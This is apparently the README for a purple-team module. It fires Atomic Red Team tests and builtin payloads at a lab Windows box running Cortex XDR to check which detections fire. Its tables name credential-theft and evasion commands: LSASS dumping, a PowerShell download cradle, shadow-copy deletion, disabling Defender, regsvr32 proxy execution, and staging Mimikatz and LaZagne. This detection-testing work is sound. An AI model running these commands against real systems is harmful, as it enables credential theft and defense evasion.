# XDR Attack Orchestration

**Type:** Coordinator / scenario (not a `generate_log` data-source module)
**Transport:** WinRM to the target box (pywinrm) + LogSim's existing network transports
**Status:** Phase 1 — foundation built and validated against a live box; executor / stories / orchestrator in progress

Unlike every other module, this one does **not** fake telemetry. It triggers *real* [Atomic Red Team](https://github.com/redcanaryco/invoke-atomicredteam) techniques on a *real* Windows workstation running the **Cortex XDR agent** — so XSIAM's agent-bound **endpoint** behavioral analytics genuinely fire — while LogSim emits **synthetic network logs pinned to that same box's real host/user/IP** and timed around the real activity. XSIAM then stitches endpoint + network into one coherent incident. An XSIAM management-API key can flip the agent between alerting and blocking.

This closes the one gap synthetic feeds can't: the Cortex agent's own data model can only be driven by real endpoint activity.

- **Package:** `modules/xdr_orchestration/` (a package, not a generator — the loader only scans top-level `modules/*.py`, so nothing here is startable as a data source)
- **Reached only through** `WorkstationConnection` (`connection.py`) — the single, fail-closed path to the box
- **Registered** (once complete) as a scenario in `get_scenarios()`, so it flows through the existing run-tracking + transports unchanged

---

## Configuration — everything lives in `.env`

**You never edit `config.json` to point at a box.** All deployment-specific values are read from `.env` under fixed variable names; `config.json` holds only structural defaults and a dev-only stub identity.

### `.env` (the only file you touch)

| Variable | Required | Default | Purpose |
|---|---|---|---|
| `XDR_TARGET_HOST` | live box | — | Box IP or hostname |
| `XDR_TARGET_WINRM_USER` | live box | — | Local-admin username (no `DOMAIN\` prefix for a workgroup box) |
| `XDR_TARGET_WINRM_PASSWORD` | live box | — | Local-admin password |
| `XDR_TARGET_WINRM_PORT` | no | `5985` | WinRM port |
| `XDR_TARGET_WINRM_SCHEME` | no | `http` | `http` (5985) or `https` (5986) |
| `XDR_TARGET_WINRM_AUTH` | no | `ntlm` | `ntlm` \| `basic` \| `kerberos` |
| `XDR_TARGET_TRANSPORT` | no | `winrm` | Set to `stub` for no-box development (uses `config.json` `stub_identity`) |
| `XDR_TARGET_EGRESS_IP` | no | — | Org NAT/public IP that external-facing logs (Zscaler, perimeter FW) should carry; discovery only knows the internal IP |
| `XDR_EMAIL_DOMAIN` | no | — | Derive user email when discovery can't |
| `XSIAM_API_BASE` / `XSIAM_API_KEY_ID` / `XSIAM_API_KEY` | read-back (optional) | — | Cortex `/public_api` **Standard** key. Powers the detection **scorecard + Re-score** (which expected alerts fired, endpoint↔network coalescence), the prevention probe + policy control (agent alert↔block), and the dashboard "XSIAM tenant" HEALTH rows. All three required together; the run itself works without them, but the scorecard then reports *unavailable*. Set them and the dashboard Health tab turns green for the **XSIAM API · Public API credentials (read-back)** check. |

The variable *names* are defined once as `ENV_*` constants on `WorkstationConnection` in `connection.py`.

### `config.json` — structural only (no target values)

```json
"xdr_orchestration": {
  "connection": {
    "transport": "winrm",
    "stub_identity": {
      "username": "labuser", "hostname": "lab-wks01.corp.example",
      "ip": "192.168.0.60", "department": "Finance", "email": "labuser@corp.example"
    }
  },
  "xsiam": {
    "api_base_env_var": "XSIAM_API_BASE",
    "key_id_env_var": "XSIAM_API_KEY_ID",
    "key_env_var": "XSIAM_API_KEY"
  }
}
```

`transport` here is only a default — `XDR_TARGET_TRANSPORT` in `.env` overrides it. `stub_identity` is used only when transport is `stub`.

---

## Preflight (fail-closed health gate)

The orchestrator refuses to fire any technique unless `WorkstationConnection.preflight()` passes. Phase-1 checks:

| Check | What it verifies |
|---|---|
| **.env target settings** | `XDR_TARGET_HOST`, `XDR_TARGET_WINRM_USER` and `XDR_TARGET_WINRM_PASSWORD` are set, are not the `.env.example` placeholders, and the host looks like an IP or hostname. Shows the host and user it found; the password is only reported as set. Blocking. |
| **.env XSIAM read-back** | `XSIAM_API_BASE`, `XSIAM_API_KEY_ID` and `XSIAM_API_KEY` are all set (the scorecard needs them). Never blocks: SKIP when absent or incomplete. |
| **WinRM reachable + auth** | TCP to the port is open, then a `whoami` round-trips under the configured credentials |
| **Identity discovery** | The live box reports a logged-in user + hostname + primary IPv4 (the triad the synthetic logs will carry) |
| **Atomic present** | `Invoke-AtomicTest` is importable on the target |
| **Cortex agent healthy** | The `cyserver` service is installed and Running (else no endpoint telemetry) |
| **XSIAM API reachable** | Only when policy control is requested for the run (needs `XSIAM_API_*`; the read-back scorecard uses the same key) |

### Run it

```bash
# Live box (reads .env):
python _local_validation/xdr_preflight_check.py

# No-box dev (uses config.json stub_identity):
python _local_validation/xdr_preflight_check.py --stub

# Machine-readable:
python _local_validation/xdr_preflight_check.py --json
```

Exit code is `0` only when preflight is GREEN, so the harness doubles as a gate. Example live output:

```
Preflight: RED — orchestrator will refuse to fire
  ✓ WinRM reachable + auth: PASS — authenticated as lab-wks01\labuser
  ✓ Identity discovery: PASS — user=labuser host=lab-wks01 ip=192.0.2.44
  ✗ Atomic present: FAIL — Invoke-AtomicTest not importable — install Invoke-AtomicRedTeam
  ✓ Cortex agent healthy: PASS — cyserver service Running
```

---

## Preparing a box

WinRM must be enabled and Atomic installed before preflight goes green. A console-generated **Kickstarter** will automate this (planned); until then:

1. **Enable WinRM** — copy `docs/enable-winrm-on-box.ps1` to the box and run it **elevated**. It turns on WinRM, scopes the firewall rule to the LogSim console IP (edit `$ConsoleIP` — for a VMware VM use the VMnet host adapter IP), and sets `LocalAccountTokenFilterPolicy=1` so a local admin gets a full token remotely (needed for admin-level Atomic tests). It ships with rollback notes.
2. **Install Atomic** — run `docs/install-atomic-on-box.ps1` (elevated on the box, or over WinRM from the console). It is **fully non-interactive**: it pre-installs the **NuGet provider**, **trusts PSGallery**, and pre-satisfies `powershell-yaml` so `Install-AtomicRedTeam` never stops on the "NuGet provider is required" / "Untrusted repository" approvals that otherwise block automation (and silently fail over WinRM). It then installs Invoke-AtomicRedTeam + the atomics and verifies `Invoke-AtomicTest` resolves. Idempotent.
   > **Cortex will quarantine the drops** unless you first allow-list the Atomic paths (or set the endpoint's prevention profiles to Report mode) — see [Cortex prevention & Atomic drops](#cortex-prevention--atomic-drops) below.
3. **Verify the Cortex agent** is installed and `cyserver` is Running.

### Cortex prevention & Atomic drops

Cortex XDR's malware/WildFire and Behavioral Threat Protection will flag or quarantine Atomic payloads as they land. To let the files drop **while preserving the endpoint alerts this module depends on**, prefer **Report (alert-only) mode over Disabled**:

- **Path allow-list** (surgical) — in **Endpoints → Policy Management → Prevention → Profiles**, add the Atomic locations to the Malware profile allow-list: `C:\AtomicRedTeam\`, `C:\Users\<user>\AppData\Local\Temp\`, and the `...\WindowsPowerShell\Modules\invoke-atomicredteam\` path. Everything outside those paths still protects/alerts.
- **Report-mode endpoint group** (for actual runs) — put the target in its own group with Malware / Exploit / BTP profiles set to **Report**, so techniques execute and real alerts still fire for XSIAM to correlate.
- If a specific payload is quarantined by hash even with the path allow-list, add a **hash allow-list** entry or drop that technique from the story.

> Fully disabling prevention removes the endpoint telemetry that is the whole point of this module. Automating this alert↔block flip via `/public_api` is the planned job of `xsiam_client.py` (verify the tenant's actual policy-API surface before coding against it).

> **Lab-only, security-sensitive tooling.** Use a dedicated, authorized demo box. Curate techniques to non-destructive, cleanup-capable Atomics.

---

## Identity discovery → synthetic-log seed

`connection.discover_identity()` queries the live box and returns the ground-truth triad (logged-in user, hostname/FQDN, primary IPv4) in the same shape `session_utils.get_user_by_name` yields. Those discovered facts seed **all** synthetic generation — bypassing `session_utils` randomization — so the project works on anyone's box with zero renaming. `.env` overrides (`XDR_TARGET_EGRESS_IP`, `XDR_EMAIL_DOMAIN`) win over discovery. Discovery yields the box's **internal** IP (correct for internal firewall/DNS logs); external-facing logs need the org's NAT/egress IP via `XDR_TARGET_EGRESS_IP`.

---

## Console (dedicated "⚔ XDR Attack" tab)

The dashboard has its own top-level **⚔ XDR Attack** tab (styled distinctly so purple-team runs are easy to spot and isolate). It surfaces:

- **Preflight** — live per-check pass/fail and the discovered `user`/`host`/`ip` the run will carry (fail-closed gate). Backed by `GET /api/v1/attack/health`. Each check re-reads the `XDR_*` and `XSIAM_API_*` values from `.env`, so a fix there shows up on the next **Re-check preflight** without restarting the dashboard.
- **Run a story** — pick a story, optional **dry-run** (no techniques fired; synthetic logs only), and fire a small isolated run. Backed by `POST /api/v1/attack/run` → poll `GET /api/v1/attack/runs/<id>` for technique results + emitted manifest.
- **Generate workstation installer** — downloads the Kickstarter `.ps1` (`GET /api/v1/attack/kickstarter`).

Stories (also registered as CLI scenarios 24/25/26):

| id | Scenario | Arc |
|---|---|---|
| `xdr_quick` | 25 | recon (T1033) + one aligned DNS/web C2 beacon — fast, small footprint |
| `xdr_reference` | 24 | full kill-chain: 7-technique discovery sweep (T1082/T1016/T1033/T1057/T1049/T1087.001/T1518.001) → C2 (DNS beacon + DNS tunnel + web C2) → persistence ×2 (T1547.001 Run key + T1053.005 Scheduled Task), both cleaned up |
| `xdr_intrusion` | 26 | credential-theft "smash-and-grab" — deliberately AVOIDS discovery to broaden XDR's detection view: LOLBin ingress (T1105-13 MpCmdRun) → OS credential dumping (T1003.001-2 comsvcs LSASS MiniDump) → credentials-in-files (T1552.001-4 findstr) → indicator removal (T1070.004-6 file deletion) → local data staging (T1074.001-3 Compress-Archive) → HTTP exfil (T1048.003-4), with aligned web download / web-exfil / DNS-tunnel / perimeter-firewall egress |

Every technique is non-destructive and cleanup-capable (test numbers validated live via `-ShowDetails`). The `xdr_intrusion` story uses the `Step.prereqs` hook to stage a technique's target (e.g. the file T1070.004 deletes) with `-GetPrereqs` before firing.

**`xdr_recon`** (a dashboard story — runnable from the story picker, not a numbered CLI scenario) breaks the `xdr_reference` discovery sweep out as a standalone, fire-on-demand recon stage: the same seven read-only techniques (T1082 systeminfo / T1016 ipconfig·arp·route / T1033 whoami / T1057 tasklist / T1049 netstat / T1087.001 net user / T1518.001 AV·EDR discovery), with the netstat step paired to a synthetic internal SMB share-enumeration + port scan from the box (and its default PAN NGFW rendering). Non-destructive, read-only, nothing to clean up. These rarely alert alone — hence no `expected_alerts` — but they build the behavioural picture and the correlation volume the analytics key on, and the arc stitches to the one discovered identity like every other story.

### WildFire stage (`xdr_wildfire`)

The Atomic tests exercise behaviour. This story exercises the agent's **malware module** with a real WildFire verdict. It uses a **builtin payload** (`payloads.py`): a fixed, reviewed PowerShell script run over the same WinRM channel as the Atomic tests. It is selected with:

```yaml
technique: {id: T1204.002, executor: builtin, payload: wildfire_pe}
```

The `wildfire_pe` payload:

1. Downloads Palo Alto's WildFire test PE from `http://wildfire.paloaltonetworks.com/publicapi/test/pe`. This is the non-SSL URL; the WildFire API's `/test` resource needs no API key.
2. Saves it as `C:\Users\Public\Downloads\wildfire-test-pe-file-<run tag>.exe`. That folder is deliberately **outside** the Atomic allow-list paths (`C:\AtomicRedTeam\`, `AppData\Local\Temp\`); a file inside them would never be scanned.
3. Hashes the file and runs it. It then reports whether the agent blocked execution or quarantined the file. Either counts as success: that is the detection.
4. **Leaves the file on disk.** Each run instead deletes earlier runs' test files before downloading, so at most one test file is ever on the box. An unknown hash is allowed to run while the agent uploads it to WildFire in the background. On 2026-11-18, a cleanup that deleted the file 15 seconds after it ran left the agent with FILE_WRITE and PROCESS_START events but no verdict, and no alert.

Every download has a different SHA-256 and the verdict is always malware. Each run is therefore a never-seen sample: the agent finds no cached verdict, WildFire analyses it, and the malware verdict raises the agent's WildFire alert. Allow about 5 minutes. Cortex lists "Cortex XDR agent generates WildFire malware issues" among its onboarding health checks, using this test file.

The step's matching Zscaler `sandbox_threat` record is built from the payload's real result: the same file name, SHA-256 and URL. It is recorded as **Allowed** with a malicious sandbox verdict, because the file did reach the box.

**Confirmed on 2026-11-18:** about 10 minutes after the run, the agent raised **`WildFire Malware`**: source `XDR Agent`, severity high, action `Detected (Post Detected)`. It landed in the run's single case, and the scorecard scored the T1204.002 row 1/1. The agent allowed the never-seen hash to run and alerted once WildFire returned the malware verdict.

The box needs outbound HTTP to `wildfire.paloaltonetworks.com`. Builtin steps install no Atomic prereqs; the Kickstarter skips them.

### Behaviour stages (`xdr_procdump`, `xdr_squiblydoo`, `xdr_shadow_delete`, `xdr_cradle`, `xdr_encoded`, `xdr_tamper`)

More **builtin-payload** stories, each a short arc (orient with `whoami`, then one high-signal behaviour). They are endpoint-only — the detection is the behaviour on the box, so there is no synthetic network half — and each drops any files outside the Atomic allow-list paths, like `wildfire_pe`. None installs an Atomic prereq. (The one exception is `xdr_cradle` in its optional `http(s)`-url mode, which adds a synthetic perimeter egress half; see below.)

| id | Technique | What the payload does | Why it fires |
|---|---|---|---|
| `xdr_procdump` | T1003.001 — LSASS Memory | Downloads Sysinternals **ProcDump** to `C:\Users\Public\Downloads` and runs `procdump -accepteula -ma lsass.exe`. The dump (LSASS memory) is deleted immediately; the tool is cleaned up after. | Credential Gathering / LSASS access on a **Microsoft-signed** tool — proves the behavioral detection, not a file signature. Complements the comsvcs.dll MiniDump in `xdr_intrusion`/`xdr_lateral`. |
| `xdr_squiblydoo` | T1218.010 — Regsvr32 | Stages a benign local COM scriptlet and runs `regsvr32 /s /n /u /i:<sct> scrobj.dll`; the scriptlet spawns `cmd.exe` to write a marker. Scriptlet + marker cleaned up after. | Behavioral Threat Protection: regsvr32 proxy-executing script and spawning a child. A **local** scriptlet is used (no fetch) so the stage is self-contained. |
| `xdr_shadow_delete` | T1490 — Inhibit System Recovery | Invokes `vssadmin delete shadows /shadow={…} /quiet`. | Ransomware-prep behaviour the agent flags and usually **prevents**. **Non-destructive by design**: the shadow id is a random, non-existent GUID, so no real shadow copy is removed, while the command line the detector keys on is still produced. A hard wipe would use `delete shadows /all /quiet` — deliberately not the default. |
| `xdr_cradle` | T1059.001 — PowerShell | Stages a tiny local marker-writing `.ps1`, then launches a **child `powershell.exe`** whose command line is the canonical cradle `IEX (New-Object Net.WebClient).DownloadString('<url>')`. `.ps1` + marker cleaned up after. | PowerShell command-line / script-block analytics key on `System.Net.WebClient` + `DownloadString` + `Invoke-Expression` — the **command-line shape**, not what runs. **Benign + self-contained by default**: the URL is a `file://` pointing at the staged marker script, so no bytes leave the box and IEX only runs our own marker write. Run as a visible child process **deliberately** — not via the base64/certutil delivery that hides legit scripts (§ transport) — so the agent sees the artifact. Pass an `http(s)` `url` per run (`run_story(..., cradle_url=…)`) for a true-egress cradle (fetches + IEXes whatever that URL serves — point it only at trusted content; no marker then). **Only in that mode** the step also emits a synthetic perimeter half — a Zscaler web-proxy record naming the exact fetched URL/host plus the firewall egress fan-out (and the default PAN NGFW rendering), all pinned to that URL's host — so the scorecard shows a **network**-sourced detection alongside the endpoint one. A `file://` run emits none of it, and the scorecard scores only what was actually emitted (`summary["network_emitted"]`), so the common path never reads as a network miss. |
| `xdr_encoded` | T1027.010 — Command Obfuscation | Builds a benign inner command (marker write + `Write-Host`), base64-encodes its UTF-16LE bytes on the box, and launches a **child `powershell.exe -EncodedCommand <base64>`**. Marker cleaned up after. | The near-universal "suspicious / encoded PowerShell" heuristic keys on the `-EncodedCommand`/`-enc` flag carrying a base64 blob on a powershell command line. **Benign**: the decoded command only writes a marker and prints a line (verified to contain no `IEX`/download/destructive verbs). Run as a visible child **deliberately** — the base64/certutil delivery exists to *avoid* this very alert, so here it is inverted. |
| `xdr_tamper` | T1562.001 — Impair Defenses | `Set-MpPreference -DisableRealtimeMonitoring $true` + `Add-MpPreference -ExclusionPath`, then **reverts both immediately**; cleanup re-asserts the revert. | The Defender-tamper BIOC fires on the attempt; protection is left **ON**. **Reversible by design.** Reuses the `disable_defender` payload from the `xdr_evasion` chain, broken out as a one-shot. If **Tamper Protection** is enabled the disable is blocked — itself the detection. |

Each payload's `judge` counts success as "the behaviour reached the box" — whether the agent let it complete (Report mode) or blocked it (prevention); only a payload that could not run at all (e.g. a failed ProcDump download, or a cradle that could not stage its local script) is a failure. The expected endpoint alert names in `TECHNIQUE_CATALOG` for T1218.010, T1490, T1059.001 and T1027.010 are **best-effort** and should be tuned against the tenant after the first run (the names the agent actually raises show up under "Also fired for this run"); T1003.001 reuses the confirmed credential-dumping names.

### Scenario chains (P4)

Four multi-step **scenario** stories recombine the builtin palette (all self-contained, non-destructive, cleanup-capable — no Atomic prereq downloads):

| id | Chain | New builtin techniques |
|---|---|---|
| `xdr_ransomware` | recon → LSASS dump (comsvcs) → **shadow-copy deletion** → **mass-encryption simulation** + ransom note | T1486 `ransomware_sim` (scratch dir only), reuses T1490 |
| `xdr_cred_theft` | LOLBin ingress → **Mimikatz** → **SAM/SYSTEM/SECURITY hive dump** → **LaZagne** → HTTP exfil (aligned synthetic net) | T1003.001 `mimikatz`, T1003.002 `sam_hive_dump`, T1555 `lazagne` |
| `xdr_evasion` | **Squiblydoo** → **mshta** → **MSBuild inline task** → **disable Defender** (reverted) → **clear event log** | T1218.005 `mshta_proxy`, T1127.001 `msbuild_inline`, T1562.001 `disable_defender`, T1070.001 `clear_event_log` |
| `xdr_persistence_sweep` | Run key → scheduled task (Atomic) → **new service** → **WMI event subscription** → **Startup-folder .lnk** | T1543.003 `new_service`, T1546.003 `wmi_subscription`, T1547.001 `startup_folder` |

Non-destructive by design: `ransomware_sim` only rewrites files it creates in a scratch dir and drops a clearly-labelled simulation note; `sam_hive_dump` deletes the hives immediately; `disable_defender` reverts real-time protection and removes its exclusion; `clear_event_log` clears a custom `LogSim-<tag>` log, not Security; every persistence foothold is removed in cleanup.

**Mimikatz and LaZagne** are staged by the Kickstarter (`EXTRA_TOOLS`, GitHub "latest" asset URLs) and run from the staged copy. The agent may quarantine them on download — that's itself a detection — in which case those steps report "not staged" and the LOLBin `sam_hive_dump` still fires. All P4 `expected_alerts` are **best-effort**; tune them against the tenant after the first run.

### Atomic-test-backed stages (vetted, by test number)

For techniques better served by a community-reviewed test than a bespoke payload, a story step just references an **Atomic Red Team** test by pinned number (`_wa("T1548.002", "4")`); the executor runs `Invoke-AtomicTest` on the box. Nothing offensive is authored here — the technique content is Atomic's, installed by the Kickstarter, and prereqs resolve **only** for the pinned test number (so the heavier variants' downloads, e.g. the UACME/WinPwn tests under T1548.002, are never pulled).

`xdr_privesc` fills **Privilege Escalation** (no other story covered it), as a priv-esc → evasion → foothold chain of three vetted, non-destructive, self-contained, cleanup-capable tests:

| Step | Atomic test | What it does |
|---|---|---|
| Privilege Escalation | **T1548.002-4** | Bypass UAC via Fodhelper (PowerShell) — HKCU `ms-settings` hijack; cleanup deletes the key |
| Defense Evasion | **T1036.003-7** | Masquerading — copy `cmd.exe` to `%TEMP%\svchost.exe`, run it, stop it; cleanup removes the copy |
| Persistence | **T1136.001-4** | Create a local user via `net.exe`; cleanup deletes the account |

Each pinned test was chosen because it is Windows, has Atomic cleanup, and needs no remote download.

`xdr_lolbin` adds two more Atomic-backed stages (Execution + Defense Evasion):

| Step | Atomic test | What it does |
|---|---|---|
| Execution | **T1047-5** | WMI Execute Local Process — `wmic process call create notepad.exe`; cleanup ends the process |
| Defense Evasion | **T1197-1** | Bitsadmin Download — `bitsadmin /transfer` creates a BITS job that fetches a benign Atomic-repo markdown (not executed); cleanup deletes the file |

The BITS job's download target is a benign public markdown; a failed fetch is non-fatal since the BITS **job creation** is the telemetry. `wmic` is present on this Windows 10 box (note: Microsoft deprecates it and disables it by default on Windows 11 24H2+).

(A firewall-tamper stage, T1562.004, was considered but left out: its Atomic definition 404'd on both the raw and HTML paths at build time, so no test number is pinned rather than guess one.)

### Story check (offline)

`validate.py` checks every story against the repo before anything fires. It doesn't need a tenant or the box.

- **Errors:**
  - a network `module` that matches no module `NAME`
  - an `event` that the named module never emits
  - a step with no ATT&CK technique id
  - malformed `test_numbers`

  A YAML story with errors is **not registered**. The loader prints why. A run of an invalid story aborts before it connects to the box.
- **Warnings:**
  - a technique outside the validated palette
  - a correlation rule name that is missing from `XSIAM imports/rule_ids.json`

  The story still runs. The console's story picker shows the warnings.

### Network vendors: Palo Alto NGFW by default

Every story step's network signal has a **Palo Alto Networks NGFW** rendering, and PAN is the only network vendor sent by default. Infoblox, Zscaler, Cisco Firepower, Check Point and Fortinet are opt-in per run. Tick them under **Network logs** in the console, or send `network_vendors: [...]` with the module names. Unselected vendors' events are skipped, counted in `summary.vendors_skipped`, and left out of the scorecard. The Infoblox DHCP identity anchor is an Infoblox log, so it follows the Infoblox box. The Windows logon anchor is always sent.

The PAN events are derived from each step's other-vendor events (`stories.PANW_EQUIVALENT`, applied in `_annotate`, so YAML stories get them too). A step that already lists PAN events keeps its own.

| Other-vendor event | PAN NGFW event | Detector it is built for |
|---|---|---|
| `C2_BEACON`, `web_c2_beacon`, `C2_EGRESS` | `xdr_c2_beacon`: 10–16 HTTPS callbacks with URL records to the run's C2 domain | none in one run (not scored) |
| `DNS_TUNNEL` | `dns_tunnel_pattern` | none (qname entropy isn't in CEF traffic) |
| `port_scan` | `port_scan` | Suspicious port scan |
| `smb_share_enumeration`, `smb_new_host_lateral`, `smb_rare_file_transfer` | `rare_smb` | Rare SMB session to a remote host |
| `rdp_lateral` | `rare_rdp` | Rare RDP session to a remote host |
| `data_exfil` | `large_upload_https` | Large Upload (HTTPS) |
| `large_download`, `sandbox_threat` | `xdr_web_download`: the exact URL a builtin payload fetched (e.g. the WildFire test PE over HTTP/80), else a large binary | none (not scored) |
| `reverse_ssh_tunnel` | `unusual_ssh_external` | Unusual SSH activity with tunnel characteristics to external destination |

In `panw_ngfw.py`, an orchestrated call pins the actor (`session_context["_xdr_actor"]`), so every PAN generator emits from the box's internal IP, user and host. The firewall logs the pre-NAT client. `xdr_c2_beacon` and `xdr_web_download` are orchestration-only and never drawn in ambient generation.

Scoring: one alert counts for at most one detection row. The most specific row (longest name) claims it first, so a single "Suspicious port scan" alert can't satisfy both PAN's row and Zscaler's "Port Scan".

### Fresh C2 domain per run (default on)

The shipped C2 correlation rules suppress repeats for 1 hour, keyed on source IP plus domain. Every run fires from the same box IP, so rerunning a story within the hour silences those rules: the logs arrive, but no alert fires. On 2026-11-18, Check Point, Fortinet and Infoblox stayed silent on a rerun 33 minutes later.

By default each run therefore adds a 4-character random tag to every story domain, for example `update-check-svc.net` → `update-check-svc-k3f9.net`. The tag goes into step params, technique input args and network contexts. Distinct domains stay distinct. The mapping is saved as `summary.run_domains`, and the scorecard uses it to recognise the run's alerts, including on a later Re-score.

To turn it off, untick **Fresh C2 domain each run** in the console, or send `fresh_domains: false`. Setting a domain override also turns it off.

### Scorecard read-back

- **Sources:** the analytics and correlation sources (`XDR Analytics`, `XDR Analytics BIOC`, `Correlation`) plus the agent sources (`XDR Agent`, `XDR BIOC`, `XDR IOC`). The box's own Cortex detections arrive as `XDR Agent`.
- **Only the run's alerts count.** An expected detection is matched only by an alert that carries one of the run's markers (listed under "Also fired for this run" below). A same-named alert from background traffic or another host is shown on the missed row as "did fire, but not for this run" and is not counted.
- **Endpoint rows match by technique:** the step's ATT&CK id is compared with the alert's `mitre_technique_id_and_name` tags. A tag of the same technique, its parent, or one of its sub-techniques counts. The step's name fragments are only a fallback.
- **Fetch size:** alerts are fetched newest first, 30 per minute of window, between 300 and 3,000. When the cap is hit, the scorecard flags it as `truncated`, because the run's earliest alerts may have been cut off.
- **Window:** from the run's `started_at`, minus 5 minutes, to now, with a minimum of 15 minutes. It is recomputed whenever the scorecard is pulled, so a later **Re-score** still reaches the run's first alerts.
- **Also fired for this run:** alerts that no expectation claimed, but that carry one of the run's own markers. The markers are:
  - the box user (`user`, `DOMAIN\user`, `user@…`)
  - the box host's short name
  - the box's internal IP
  - a domain the run used

  The egress IP is deliberately not a marker: it is the office's shared NAT address, so background traffic carries it too.
- **Cases:** every alert from `get_alerts_multi_events` carries its `case_id`. The scorecard judges whether the run landed in one case from those ids. It falls back to the user/host incident lookup only when no run alert has a case yet. Detected alerts with no `case_id` are listed separately. Those alerts were not grouped into any case, and in a 2026-11-18 sample of this tenant they were all low severity.
- **Console links:** case numbers and alert names open the item in the Cortex console in a new tab: cases at `/case?caseid=<case id>`, alerts at `/issue-view/<alert id>`. Repeated "also fired" alerts get a numbered link per alert (up to 10). The console address is `XSIAM_API_BASE` without `api-`, or `XSIAM_CONSOLE_URL` when set. Scorecards saved before this change show plain ids until re-scored.

## The Kickstarter (console-generated one-shot installer)

`modules/xdr_orchestration/kickstarter.py` renders a self-contained PowerShell script from the running console's own values (its IP/URL, a scoped token, exactly the atomics the stories need, and the builtin-payload tooling they need). Download it from the tab's **Generate workstation installer** button or `GET /api/v1/attack/kickstarter`. Run it **elevated** on a bare box and it: enables WinRM (firewall scoped to the console IP + `LocalAccountTokenFilterPolicy`), installs Invoke-AtomicRedTeam + the story prereqs **unattended** (NuGet/PSGallery/powershell-yaml pre-satisfied), **stages builtin-payload tooling** (currently ProcDump → `C:\ProgramData\LogSim`, for the `procdump_lsass` stage), verifies the Cortex agent, self-checks (mirrors preflight), checks outbound connectivity for the run-time download stages, and phones home readiness to `/api/v1/attack/register`. Idempotent; ships with `-Uninstall` (which also removes the staged tools). Lab-only, watermarked.

**What the box needs for each stage, and who provides it:** the Atomic steps use Invoke-AtomicRedTeam + `-GetPrereqs` (installed). `procdump_lsass` needs ProcDump — **staged** by the Kickstarter (`all_builtin_payloads()` tells it which tools to stage), and the payload copies the staged copy at run time, falling back to a live download from `live.sysinternals.com` if the box was not kickstarted. `squiblydoo` (regsvr32 + scrobj.dll) and `vss_shadow_delete` (vssadmin) use **built-in Windows binaries** — nothing to download. The admin's full token for LSASS access (SeDebugPrivilege) comes from `LocalAccountTokenFilterPolicy=1`. The only stage that cannot be pre-staged is `wildfire_pe`: it must download a **fresh-hash** test PE from `wildfire.paloaltonetworks.com` (plain HTTP) every run, so the Kickstarter instead verifies that host is reachable (warn-only — not every run uses it).

### Run once: self-heal + live manifest

The Kickstarter is built so a **single run sticks** — you should not have to regenerate or re-run it as stories grow or the box drifts.

- **Self-heal scheduled task.** The first run copies the script to `C:\ProgramData\LogSim\logsim-kickstarter.ps1` and registers a task **`LogSim XDR Self-Heal`** (at boot + daily 03:00, as `SYSTEM`) that re-runs it in **`-Refresh`** mode. Refresh re-asserts WinRM + the scoped firewall rule + `LocalAccountTokenFilterPolicy`, so a reboot or GPO sweep can't leave the box red, and ensures Atomic is present. It's idempotent; you can also run `-Refresh` by hand.
- **Live provisioning manifest.** Each refresh fetches `GET /api/v1/attack/kickstarter/manifest` — the exact Atomic **tests** (`all_atomic_tests()` → each technique with its *pinned* test numbers) and builtin-payload tools (`all_builtin_payloads()`) any registered story needs, computed live from the registry — and installs/stages whatever is **missing** (`-GetPrereqs` is idempotent; tools are staged only when absent). **Add a story later and the box provisions it on its next refresh**, no regenerate, no re-run. If the console is unreachable the refresh falls back to the test/tool list baked into the script at generation time, so an offline box still provisions what it shipped with.
- **Prereqs are scoped to the pinned tests.** The box runs `Invoke-AtomicTest <id> -TestNumbers <n> -GetPrereqs`, never per-technique. This matters: resolving a whole technique makes Atomic try to satisfy *every* test under it, including cloud tests whose prereqs pull the **retired AzureAD module** and LSASS tests whose prereqs download **Process Hacker from a SourceForge mirror** — both of which fail with "failed to meet prerequisites" and neither of which our stories use (the LSASS step is comsvcs.dll, test 2). Scoping to the pinned tests means those downloads are never attempted.
- **Inventory reporting folded in.** Every install and refresh POSTs to `/api/v1/attack/register` not just the PASS/FAIL self-check but an `inventory` (Atomic installed, techniques provisioned, which tools are staged, token policy, whether the self-heal task exists, and the manifest source + mode), so the console's readiness view shows exactly what each box has.
- **Rollback.** `-Uninstall` removes the self-heal task, the staged tools (`C:\ProgramData\LogSim`), WinRM/firewall/token config, and the atomics.

A new tool-based stage added later just needs its staging branch in the Kickstarter's `Stage-Tools` function; the manifest already carries its payload name, so kickstarted boxes stage it automatically on their next refresh.

### Extra lab tools (staged, not auto-fired)

Beyond the tools a stage needs, the Kickstarter stages a short list of **extra lab tools** — present on the box for an operator (or a future stage) to call, but not fired by any current stage. It's defined by `kickstarter.EXTRA_TOOLS`, served in the manifest as `extra_tools`, staged by `Stage-ExtraTools`, reported in the inventory, and removed by `-Uninstall` with the rest of `C:\ProgramData\LogSim`.

- **Process Hacker** (`ProcessHacker.exe`). A process/credential-inspection hacktool with no clean headless CLI, so it's staged for **manual** use (e.g. dumping lsass by hand in a demo, which the Cortex agent flags) and as a ready dependency for a future Process-Hacker stage — it is **not** auto-fired. It's pulled from `downloads.sourceforge.net` (SourceForge's mirror **redirector**, which picks a healthy mirror — deliberately not a single pinned mirror host like the `versaweb.dl.sourceforge.net` that fails DNS), the `processhacker-2.39-bin.zip` is expanded, and the x64 `ProcessHacker.exe` is copied into `C:\ProgramData\LogSim`. Staging is idempotent and non-fatal; on a prevention-mode box the agent may quarantine it on write (in which case it just isn't staged).

Adding another lab tool is one entry in `EXTRA_TOOLS` (name, on-disk file, URL, and — for a `.zip` — the member to extract); kickstarted boxes stage it on their next refresh with no regenerate.

## Roadmap

- **Phase 1 (in progress):** `connection.py` ✅ → `executor.py` (WinRMAtomic + DryRun) → one reference story → `orchestrator.py`; `/api/v1/attack/*` routes.
- **Phase 2:** data-driven story files, closed-loop incident pull-back, tighter time alignment, MCP tools, the Kickstarter installer.
- **Phase 3:** more executors (Caldera, SSH/Kali), multi-host lateral-movement stories — see the design note [Two-Agent Lateral Movement](xdr-two-agent-lateral-design.md) for the seams a real A→B pivot between two differently-named Cortex-agent boxes would need.
